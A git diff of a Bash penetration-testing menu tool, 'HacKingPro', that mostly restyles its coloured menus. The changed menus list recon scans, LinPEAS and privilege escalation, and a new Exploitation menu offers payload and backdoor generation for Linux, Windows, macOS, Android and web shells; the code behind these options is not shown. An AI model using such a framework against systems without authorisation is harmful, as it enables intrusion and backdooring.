-    ${DGrey}|    ┖──${BRed}[${DGrey} ni ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} NetInfo Scan ${BRed}]
+    ${DGrey}|  ┖─┲──${BRed}[${DGrey} n0 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Nmap Scan ${BRed}]
+    ${DGrey}|    ┖──${BRed}[${DGrey} ni ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} NetInfo Scan ${BRed}]
     ${DGrey}|
     ${DGrey}|──┲${BRed}[${BYellow} CSI ${BRed}]${BGreen}── ${BRed}[${BYellow} Social Information ${BRed}]
-    ${DGrey}|  ┖────${BRed}[${DGrey} uf ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} UserFinder Scan ${BRed}]
+    ${DGrey}|  ┖────${BRed}[${DGrey} uf ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} UserFinder Scan ${BRed}]
     ${DGrey}|
     ${DGrey}|──┲${BRed}[${BYellow} CLI ${BRed}]${BGreen}── ${BRed}[${BYellow} Local Information ${BRed}]
-    ${DGrey}|  ┖─┲──${BRed}[${DGrey} l0 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} MyIP Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} l1 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} LinPEAS {5 Min +-}${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} l2 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Local_Net_Info ${BRed}]
-    ${DGrey}|    ┖──${BRed}[${DGrey} l3 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Host_Info${BRed}]
+    ${DGrey}|  ┖─┲──${BRed}[${DGrey} l0 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} MyIP Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} l1 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} LinPEAS {5 Min +-}${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} l2 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Local_Net_Info ${BRed}]
+    ${DGrey}|    ┖──${BRed}[${DGrey} l3 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Host_Info${BRed}]
     ${DGrey}|
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Reconnaissance & Information Gathering ${BRed}]${BGreen}──╼ ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Reconnaissance & Information Gathering ${BRed}]${BYellow}╼▰  ${BGreen}   ")
           read -p "$HacKingProMenuMain" cmd
           case $cmd in
             ls )
@@ -8647,11 +8972,11 @@ MainMenu(){
     ${DGrey}|
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} CMI ${BRed}]${BGreen}──╼ ${BGreen}  ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Information Gathering ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} CMI ${BRed}]${BYellow}╼▰  ${BGreen}  ")
                 read -p "$HacKingProMenuMain" cmd
                 case $cmd in
                   x|X|exit|quit|Exit )
@@ -8686,11 +9011,11 @@ MainMenu(){
     ${DGrey}|
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} CMI ${BRed}]${BGreen}──╼ ${BGreen}  ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Information Gathering ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} CMI ${BRed}]${BYellow}╼▰  ${BGreen}  ")
                 read -p "$HacKingProMenuMain" cmd
                 case $cmd in
                   x|X|exit|quit|Exit )
@@ -8721,11 +9046,11 @@ MainMenu(){
     ${DGrey}|
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} CSI ${BRed}]${BGreen}──╼ ${BGreen}  ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Information Gathering ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} CSI ${BRed}]${BYellow}╼▰  ${BGreen}  ")
                 read -p "$HacKingProMenuMain" cmd
                 case $cmd in
                   ls )
@@ -8768,23 +9093,23 @@ MainMenu(){
     ${DGrey}┌──${BRed}[${BYellow} Collecting Public Information ${BRed}]
     ${DGrey}|
     ${DGrey}|──┲${BRed}[${BYellow} CPI ${BRed}]${BGreen}── ${BRed}[${BYellow} Public Information ${BRed}]
-    ${DGrey}|  ┖─┲──${BRed}[${DGrey} p0 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Ping Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p1 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Arp Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p2 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nslookup Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p3 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dig Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p4 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} WhoIs Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p5 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dirb Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p6 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} TraceRoute Scan ${BRed}]
-    ${DGrey}|    |──${BRed}[${DGrey} p7 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nmap Scan ${BRed}]
-    ${DGrey}|    ┖──${BRed}[${DGrey} show ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} show Scan ${BRed}]
+    ${DGrey}|  ┖─┲──${BRed}[${DGrey} p0 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Ping Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p1 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Arp Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p2 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Nslookup Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p3 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Dig Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p4 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} WhoIs Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p5 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Dirb Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p6 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} TraceRoute Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p7 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Nmap Scan ${BRed}]
+    ${DGrey}|    ┖──${BRed}[${DGrey} show ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} show Scan ${BRed}]
     ${DGrey}|
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${slowBlink}CPI${resetT} ${BRed}]${BGreen}──╼ ${BGreen}  ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Information Gathering ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${slowBlink}CPI${resetT} ${BRed}]${BYellow}╼▰  ${BGreen}  ")
                 read -p "$HacKingProMenuMain" cmd
                 case $cmd in
                   show )
@@ -8850,34 +9175,34 @@ MainMenu(){
               ToolHeaderRun
               TargetStatusRun
               HacKingProMenuMain=$(echo "${BRed}
-    ${BYellow}${faintT}┌──$resetT${BRed}[${BYellow} Distro ${BRed}]${BGreen}──╼$resetT ${BRed}[${BCyan}  $(uname) ${BRed}]
-    ${BYellow}${faintT}|──$resetT${BRed}[${BYellow} Hostname ${BRed}]${BGreen}──╼$resetT ${BRed}[${BCyan} $(hostname) ${BRed}]
-    ${BYellow}${faintT}|──$resetT${BRed}[${BYellow} System Name ${BRed}]${BGreen}──╼$resetT ${BRed}[${BCyan} $(uname -s) ${BRed}]
-    ${BYellow}${faintT}|──$resetT${BRed}[${BYellow} System Release ${BRed}]${BGreen}──╼$resetT ${BRed}[${BCyan} $(uname -r) ${BRed}]
-    ${BYellow}${faintT}|──$resetT${BRed}[${BYellow} Kernel / Architecture ${BRed}]${BGreen}──╼$resetT ${BRed}[${BCyan} $(uname -m) ${BRed}]
-    ${BYellow}${faintT}|──$resetT${BRed}[${BYellow} Hardware Processor Architecture Name ${BRed}]${BGreen}──╼$resetT ${BRed}[${BCyan} $(uname -p) ${BRed}]
+    ${BYellow}${faintT}┌──$resetT${BRed}[${BYellow} Distro ${BRed}]${BYellow}╼▰ $resetT ${BRed}[${BCyan}  $(uname) ${BRed}]
+    ${BYellow}${faintT}|──$resetT${BRed}[${BYellow} Hostname ${BRed}]${BYellow}╼▰ $resetT ${BRed}[${BCyan} $(hostname) ${BRed}]
+    ${BYellow}${faintT}|──$resetT${BRed}[${BYellow} System Name ${BRed}]${BYellow}╼▰ $resetT ${BRed}[${BCyan} $(uname -s) ${BRed}]
+    ${BYellow}${faintT}|──$resetT${BRed}[${BYellow} System Release ${BRed}]${BYellow}╼▰ $resetT ${BRed}[${BCyan} $(uname -r) ${BRed}]
+    ${BYellow}${faintT}|──$resetT${BRed}[${BYellow} Kernel / Architecture ${BRed}]${BYellow}╼▰ $resetT ${BRed}[${BCyan} $(uname -m) ${BRed}]
+    ${BYellow}${faintT}|──$resetT${BRed}[${BYellow} Hardware Processor Architecture Name ${BRed}]${BYellow}╼▰ $resetT ${BRed}[${BCyan} $(uname -p) ${BRed}]
     ${BYellow}${faintT}┖─┲$resetT${BRed}[${BYellow} System Version ${BRed}]
     ${BYellow}${faintT}  ┖──╼ $resetT${BRed}[${BCyan}  $(uname -v) ${BRed}]
 
     ${BYellow}${faintT}┌──┲${BRed}[${BYellow} CLI ${BRed}]${BGreen}── ${BRed}[${BYellow} Local Information ${BRed}]
-    ${BYellow}${faintT}|  ┖─┲──${BRed}[${DGrey} l0 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} MyIP Scan ${BRed}]
-    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l1 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} LinPEAS {5 Min +-} ${BRed}]
-    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l2 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Local_Net_Info ${BRed}]
-    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l3 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Host_Info ${BRed}]
-    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l4 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} CheckMacSec ${BRed}]
-    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l5 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} LinuxEnum ${BRed}]
-    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l6 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} BasicInfo ${BRed}]
-    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l7 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} UserInfo ${BRed}]
-    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l8 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} PackVersion ${BRed}]
-    ${BYellow}${faintT}|    ┖──${BRed}[${DGrey} PE ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Privilege Escalation ${BRed}]
+    ${BYellow}${faintT}|  ┖─┲──${BRed}[${DGrey} l0 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} MyIP Scan ${BRed}]
+    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l1 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} LinPEAS {5 Min +-} ${BRed}]
+    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l2 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Local_Net_Info ${BRed}]
+    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l3 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Host_Info ${BRed}]
+    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l4 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} CheckMacSec ${BRed}]
+    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l5 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} LinuxEnum ${BRed}]
+    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l6 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} BasicInfo ${BRed}]
+    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l7 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} UserInfo ${BRed}]
+    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l8 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} PackVersion ${BRed}]
+    ${BYellow}${faintT}|    ┖──${BRed}[${DGrey} PE ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Privilege Escalation ${BRed}]
     ${BYellow}${faintT}|
     ${BYellow}${faintT}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} CLI ${BRed}]${BGreen}──╼ ${BGreen}  ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Information Gathering ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} CLI ${BRed}]${BYellow}╼▰  ${BGreen}  ")
                 read -p "$HacKingProMenuMain" cmd
                 case $cmd in
                   x|X|exit|quit|Exit )
@@ -9028,11 +9353,11 @@ MainMenu(){
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen} ╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
 
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} ${Anlominus} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Weaponization ${BRed}]${BGreen}──╼")
+    ${BGreen}└──${BRed}[${BYellow} ${Anlominus} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Weaponization ${BRed}]${BYellow}╼▰ ")
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
           ls )
@@ -9091,11 +9416,11 @@ MainMenu(){
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen} ╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
 
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} 🔮 ${BRed}]${BGreen}──╼ ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} 🔮 ${BRed}]${BYellow}╼▰  ${BGreen}   ")
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
           ls )
@@ -9116,48 +9441,68 @@ MainMenu(){
       done
       ;;
       04|4 )
-      while true; do
-        cd "$x_Menu_4"
-        clear
-        ToolHeaderRun
-        TargetStatusRun
-        HacKingProMenuMain=$(echo "
-    ${DGrey}┌──┲────╼ ${BRed}[${BYellow} Exploitation ${BRed}]
-    ${DGrey}|  ┖─┲──╼ ${BRed}[${BYellow} The malware begins executing on the target system ${BRed}]
-    ${DGrey}|    ┖──╼ ${BRed}[${BYellow} Malware weapon's program code triggers, which takes action on target network to exploit vulnerability. ${BRed}]
-    ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 1 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} USB ${BRed}]
-    ${DGrey}|──${BRed}[${BGreen} 2 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Email ${BRed}]
-    ${DGrey}|──${BRed}[${BGreen} 3 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} WebSite ${BRed}]
-    ${DGrey}|──${BRed}[${BGreen} 4 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Message ${BRed}]
-    ${DGrey}|
-    ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen} ╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
+        ExploitationPro() {
+          while true; do
+            clear
+            ToolHeaderRun
+            TargetStatusRun
+          HacKingProMenuMain=$(echo "${BRed}
+    ╔═╗─┐ ┬┌─┐┬  ┌─┐┬┌┬┐┌─┐┌┬┐┬┌─┐┌┐┌
+    ║╣ ┌┴┬┘├─┘│  │ ││ │ ├─┤ │ ││ ││││
+    ╚═╝┴ └─┴  ┴─┘└─┘┴ ┴ ┴ ┴ ┴ ┴└─┘┘└┘
 
+    ${DGrey}┌────╼ ${BRed}[${BYellow} Exploitation ${BRed}]
+    ${DGrey}┖─┲──╼ ${BRed}[${BYellow} The malware begins executing on the target system ${BRed}]
+    ${DGrey}  ┖──╼ ${BRed}[${BYellow} Malware weapon's program code triggers, which takes action on target network to exploit vulnerability. ${BRed}]
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${ORANGE}┌──${BRed}[${ORANGE} ** ${BRed}]${ORANGE}──${resetT}${BYellow}╼▰ ${BRed}[ ${ORANGE}Gateway: ${BGreen}$GAT  ${BRed}]
+    ${ORANGE}|──${BRed}[${ORANGE} ** ${BRed}]${ORANGE}──${resetT}${BYellow}╼▰ ${BRed}[ ${ORANGE}Local IP ADDR : ${BGreen}$myip  ${BRed}]
+    ${ORANGE}|──${BRed}[${ORANGE} ** ${BRed}]${ORANGE}──${resetT}${BYellow}╼▰ ${BRed}[ ${ORANGE}Interface Use : ${BGreen}$In  ${BRed}]
+    ${ORANGE}└──${BRed}[${ORANGE} ** ${BRed}]${ORANGE}──${resetT}${BYellow}╼▰ ${BRed}[ ${ORANGE}Public IP ADDR: ${BGreen}$myip2  ${BRed}]$RED
+
+    ${DGrey}┌──${BRed}[${BWhite} 01 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}Linux    ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Payloads   ${resetT}${BRed}]
+    ${DGrey}|──${BRed}[${BWhite} 02 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}Android  ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Backdoors  ${resetT}${BRed}]
+    ${DGrey}|──${BRed}[${BWhite} 03 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}Windows  ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Payloads   ${resetT}${BRed}]
+    ${DGrey}|──${BRed}[${BWhite} 04 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}MacOS    ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Payload    ${resetT}${BRed}]
+    ${DGrey}└──${BRed}[${BWhite} 05 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}WebShell ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Backdoor   ${resetT}${BRed}]
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}───${resetT}${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}───${resetT}${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} 🔮 ${BRed}]${BGreen}──╼ ${BGreen}   ")
-
-        read -p "$HacKingProMenuMain" cmd
-        case $cmd in
-          ls )
-          lahs
-          ;;
-          arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
-          Arsenal
-          ;;
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Anonymity ${BRed}]${BYellow}╼▰  ${BGreen}   ")
+            read -p "$HacKingProMenuMain" cmd
+          case $cmd in
+          1)wine ;;
+          2)linu ;;
+          3)mac ;;
+          4)android ;;
+          5)java ;;
+          6)web ;;
+          7)wiri ;;
+          8)fireadd ;;
+          9)webdd ;;
+          10)otherexploit ;;
           p|P )
           HacKingProPlanning
           ;;
-          x|X|exit|EXIT )
-          cd ${MainDirectoriy}
+          cl )
+          ClearTarget
+          ;;
+          ls )
+          lahs
+          ;;
+          x|X|exit|quit|Exit )
           clear
+          cd ${MainDirectoriy}
+          HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
